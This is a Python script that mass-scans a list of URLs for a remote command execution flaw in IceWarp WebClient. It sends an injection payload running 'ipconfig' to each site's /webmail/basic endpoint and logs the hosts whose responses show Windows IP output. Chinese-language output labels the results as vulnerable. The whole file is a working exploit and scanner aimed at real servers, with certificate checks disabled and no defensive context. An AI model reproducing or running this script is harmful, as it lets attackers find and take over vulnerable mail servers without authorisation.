import requests
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = "_dlg[captcha][target]=system(\\'ipconfig\\')\\"

for url in open("IceWarp.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.post(url+"/webmail/basic", data=data, headers=headers, verify=False, timeout=5)
        if("Windows IP" in jiaoyan.text):
            with open("IceWarp WebClient basic 远程命令执行漏洞.txt", "a+") as f:
                    f.write(url+"\n")
    except:
        continue
